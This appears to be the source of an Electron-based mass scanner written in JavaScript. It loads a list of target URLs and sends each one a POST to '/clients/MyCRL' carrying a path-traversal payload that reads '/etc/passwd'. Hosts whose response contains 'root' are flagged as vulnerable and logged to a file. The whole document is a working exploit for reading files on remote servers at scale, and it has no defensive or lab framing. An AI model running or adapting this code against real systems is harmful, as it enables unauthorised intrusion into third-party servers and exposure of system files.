document.getElementById('processFileButton').addEventListener('click', processFile);

function processFile() {
    const input = document.getElementById('fileInput');
    const file = input.files[0];
    if (!file) {
        document.getElementById('result').textContent = "Please select a file.";
        return;
    }

    const reader = new FileReader();
    reader.onload = function(event) {
        const text = event.target.result;
        const lines = text.split(/\r?\n/);
        lines.forEach(line => {
            if (line.trim() !== '') {
                processURL(line.trim());
            }
        });
    };
    reader.readAsText(file);
}

function processURL(url) {
    fetch(url + '/clients/MyCRL', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'aCSHELL/../../../../../../../etc/passwd'
    })
    .then(response => response.text())
    .then(data => {
        if (data.includes("root")) {
            document.getElementById('result').innerHTML += 'It is vulnerable: ' + url + '<br>';
            window.electron.send('append-to-file', 'It is vulnerable: ' + url + "\n");
        } else {
            document.getElementById('result').innerHTML += 'It is not vulnerable: ' + url + '<br>';
        }
    })
    .catch(error => {
        document.getElementById('result').textContent = `Error: ${error}`;
    });
}
